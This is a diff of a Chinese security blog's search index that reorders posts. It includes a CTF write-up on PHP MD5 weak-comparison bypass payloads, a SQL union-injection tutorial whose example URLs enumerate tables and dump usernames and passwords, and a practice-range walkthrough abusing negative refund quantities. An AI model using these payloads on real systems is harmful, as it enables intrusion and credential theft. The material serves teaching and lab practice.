@@ -1,6 +1,93 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Bugku-CTF-备份是个好习惯</title>
+    <url>/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
+    <content><![CDATA[这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。
+打开网站是一段神秘代码
+d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
+然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。
+发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下
+include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
+直接开始代码审计。
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
+这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。
+有些字符串的MD5值都以0e开头，在科学计数法中等于0：
+// 经典MD5碰撞值md5(&#x27;QNKCDZO&#x27;)          = 0e830400451993494058024219903391md5(&#x27;240610708&#x27;)        = 0e462097431906509019562988736854md5(&#x27;s878926199a&#x27;)      = 0e545993274517709034328855841020md5(&#x27;s155964671a&#x27;)      = 0e342768416822451524974117254469// 弱比较时：0e830400451993494058024219903391 == 0e462097431906509019562988736854// 因为都等于 0 × 10^N = 0
+借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708
+还有另一种方法：
+由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
+所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2同样能获得flag。
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL联合查询注入</title>
+    <url>/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[平时在浏览网页时会注意到有这种网址
+GET请求类型
+http://example.com/news.php?id=1http://example.com/profile?user=admin
+POST请求类型
+username: adminpassword: anything
+等等这个样子的都在与数据库产生信息传递
+以比较简单的GET请求来说
+http://example.com/news.php?id=1‘
+假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息
+这个news.php种必定有
+$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT id, username, email FROM users WHERE id=&#x27;$id&#x27; LIMIT 1&quot;;
+
+代码第一行从url的id参数获取值（学号）存储到id这个变量代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中
+此时如果我们http://example.com/news.php?id=1‘
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1
+必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’
+我们第一步肯定是要获取它这个表中有几个列http://example.com/news.php?id=&#39;1‘ ORDER BY 1–+ ‘ LIMIT 1
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1
+有些人估计会发现和自己想的不一样，不应该是SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗
+其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1这样才可以执行ORDER by 1
+接下来先了解一下这个ORDER by是什么东东
+ORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序
+比如ORDER by 3 会对email进行一个查排序
+如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列
+可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1
+前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫
+http://example.com/news.phpid=1‘ UNION SELECT 1,2,3–+
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1
+先来了解一下联合查询语句UNION SELECT
+SQL UNION 操作符合并两个或多个 SELECT 语句的结果
+UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似
+如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句
+http://example.com/news.php?id=1‘ UNION SELECT 1,database(),version()–+
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1
+就可以返回
+当前数据库名称
+
+MySQL 版本信息
+
+http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+
+这会列出当前数据库中的所有表名（通常会看到 users 表)
+http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+
+这会显示 users 表的所有列名（如 id, username, password）
+http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+
+这会显示所有用户名和密码（通常是 MD5 哈希）
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>KNN猫狗分类</title>
     <url>/2025/08/03/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB/</url>
     <content><![CDATA[KNN猫狗分类在生活中不同种类的生物，可以通过身高、体重等特征来进行简单的分类。猫和狗的分类就是一个典型的例子。
@@ -96,90 +183,29 @@ Python 实现代码import math# 训练数据：[[身高(cm), 体重(kg), 类别]
       </tags>
   </entry>
   <entry>
-    <title>SQL联合查询注入</title>
-    <url>/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[平时在浏览网页时会注意到有这种网址
-GET请求类型
-http://example.com/news.php?id=1http://example.com/profile?user=admin
-POST请求类型
-username: adminpassword: anything
-等等这个样子的都在与数据库产生信息传递
-以比较简单的GET请求来说
-http://example.com/news.php?id=1‘
-假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息
-这个news.php种必定有
-$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT id, username, email FROM users WHERE id=&#x27;$id&#x27; LIMIT 1&quot;;
+    <title>业务逻辑漏洞-负数</title>
+    <url>/2026/02/07/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E8%B4%9F%E6%95%B0/</url>
+    <content><![CDATA[靶场来源：好靶场（ 请一口气买102个汉堡3 ）
+漏洞复现启动靶场环境，是一个点餐平台
 
-代码第一行从url的id参数获取值（学号）存储到id这个变量代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中
-此时如果我们http://example.com/news.php?id=1‘
-此时这个SQL代码就是
-SELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1
-必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’
-我们第一步肯定是要获取它这个表中有几个列http://example.com/news.php?id=&#39;1‘ ORDER BY 1–+ ‘ LIMIT 1
-此时这个SQL代码就是
-SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1
-有些人估计会发现和自己想的不一样，不应该是SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗
-其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1这样才可以执行ORDER by 1
-接下来先了解一下这个ORDER by是什么东东
-ORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序
-比如ORDER by 3 会对email进行一个查排序
-如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列
-可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1
-前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫
-http://example.com/news.phpid=1‘ UNION SELECT 1,2,3–+
-此时这个SQL代码就是
-SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1
-先来了解一下联合查询语句UNION SELECT
-SQL UNION 操作符合并两个或多个 SELECT 语句的结果
-UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似
-如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句
-http://example.com/news.php?id=1‘ UNION SELECT 1,database(),version()–+
-此时这个SQL代码就是
-SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1
-就可以返回
-当前数据库名称
+要求一次购买102个汉堡可返回flag，优惠卷可免单。
+花钱购买1张优惠卷进行测试，在个人中心发现可以退款优惠卷。
+将退款数量改为-10000，返回退款数量必须大于0，说明前端做了校验，打开抓包工具拦截退款数据包将数量参数（refund_qty）改为-10000再发送，返回退款成功
 
-MySQL 版本信息
+此时优惠卷数量为10001，便可购买102个汉堡，返回flag
 
-http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+
-这会列出当前数据库中的所有表名（通常会看到 users 表)
-http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+
-这会显示 users 表的所有列名（如 id, username, password）
-http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+
-这会显示所有用户名和密码（通常是 MD5 哈希）
+原理分析核心问题：服务器端完全信任客户端传来的数据，未做任何校验。
+业务逻辑被颠覆：
+正常逻辑：个人优惠卷数量 = 原数量 -退货数量 (退货数量为正)
+攻击逻辑：个人优惠卷数量  = 原数量 -退货数量(退货数量为负)= 原库存 +退货数量，导致个人优惠卷数量增加
+
 ]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>WEB安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku-CTF-备份是个好习惯</title>
-    <url>/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
-    <content><![CDATA[这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。
-打开网站是一段神秘代码
-d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
-然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。
-发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下
-include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
-直接开始代码审计。
-if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
-这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。
-有些字符串的MD5值都以0e开头，在科学计数法中等于0：
-// 经典MD5碰撞值md5(&#x27;QNKCDZO&#x27;)          = 0e830400451993494058024219903391md5(&#x27;240610708&#x27;)        = 0e462097431906509019562988736854md5(&#x27;s878926199a&#x27;)      = 0e545993274517709034328855841020md5(&#x27;s155964671a&#x27;)      = 0e342768416822451524974117254469// 弱比较时：0e830400451993494058024219903391 == 0e462097431906509019562988736854// 因为都等于 0 × 10^N = 0
-借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708
-还有另一种方法：
-由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
-所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2同样能获得flag。
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>WEB安全</tag>
-        <tag>CTF</tag>
+        <tag>业务逻辑</tag>
+        <tag>web安全，靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -217,32 +243,6 @@ edusrc的最重要的信息就是后台的账号和密码了，因为后台通�
       </tags>
   </entry>
   <entry>
-    <title>业务逻辑漏洞-负数</title>
-    <url>/2026/02/07/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E8%B4%9F%E6%95%B0/</url>
-    <content><![CDATA[靶场来源：好靶场（ 请一口气买102个汉堡3 ）
-漏洞复现启动靶场环境，是一个点餐平台
-
-要求一次购买102个汉堡可返回flag，优惠卷可免单。
-花钱购买1张优惠卷进行测试，在个人中心发现可以退款优惠卷。
-将退款数量改为-10000，返回退款数量必须大于0，说明前端做了校验，打开抓包工具拦截退款数据包将数量参数（refund_qty）改为-10000再发送，返回退款成功
-
-此时优惠卷数量为10001，便可购买102个汉堡，返回flag
-
-原理分析核心问题：服务器端完全信任客户端传来的数据，未做任何校验。
-业务逻辑被颠覆：
-正常逻辑：个人优惠卷数量 = 原数量 -退货数量 (退货数量为正)
-攻击逻辑：个人优惠卷数量  = 原数量 -退货数量(退货数量为负)= 原库存 +退货数量，导致个人优惠卷数量增加
-
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>业务逻辑</tag>
-        <tag>web安全，靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>电商平台后台RCE漏洞分析：从弱口令到0day利用</title>
     <url>/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。
@@ -267,37 +267,6 @@ edusrc的最重要的信息就是后台的账号和密码了，因为后台通�
       <tags>
         <tag>WEB安全</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录一次从Windows安装Linux（Ubuntu）的全过程</title>
-    <url>/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[系统更换原因由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。
-还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。
-最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。
-过程启动盘制作首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。
-现在就可以去做启动盘了，这里我推荐Ventoy。
-启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。
-接下来去下载系统镜像，我这里下的是ubuntu-22.04.5-desktop-amd64这个版本比较稳定，也可以选择其他版本。
-下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。
-安装系统现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：
- 联想（Lenovo）：F2 或 Fn + F2惠普（HP）：Esc 然后按 F10，或直接按 F10戴尔（Dell）：F2 或 Fn + F2华硕（ASUS）：Delete 或 F2宏碁（Acer）：F2 或 Delete微星（MSI）：Delete技嘉（Gigabyte）：Delete 或 F2三星（Samsung）：F2索尼（Sony VAIO）：F2 或 Assist 键（部分型号）
-
-这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：
-
-解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。
-之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。
-安装一些软件这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。
-搜狗输入法:https://blog.csdn.net/qq_44684757/article/details/135991216要点：注意安装依赖QQ:https://blog.csdn.net/weixin_44629973/article/details/102871352
-结语整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>Ubuntu</tag>
-        <tag>系统安装</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -352,6 +321,37 @@ edusrc的最重要的信息就是后台的账号和密码了，因为后台通�
       </categories>
       <tags>
         <tag>吃瓜</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一次从Windows安装Linux（Ubuntu）的全过程</title>
+    <url>/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[系统更换原因由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。
+还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。
+最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。
+过程启动盘制作首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。
+现在就可以去做启动盘了，这里我推荐Ventoy。
+启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。
+接下来去下载系统镜像，我这里下的是ubuntu-22.04.5-desktop-amd64这个版本比较稳定，也可以选择其他版本。
+下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。
+安装系统现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：
+ 联想（Lenovo）：F2 或 Fn + F2惠普（HP）：Esc 然后按 F10，或直接按 F10戴尔（Dell）：F2 或 Fn + F2华硕（ASUS）：Delete 或 F2宏碁（Acer）：F2 或 Delete微星（MSI）：Delete技嘉（Gigabyte）：Delete 或 F2三星（Samsung）：F2索尼（Sony VAIO）：F2 或 Assist 键（部分型号）
+
+这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：
+
+解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。
+之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。
+安装一些软件这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。
+搜狗输入法:https://blog.csdn.net/qq_44684757/article/details/135991216要点：注意安装依赖QQ:https://blog.csdn.net/weixin_44629973/article/details/102871352
+结语整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>系统安装</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
 </search>
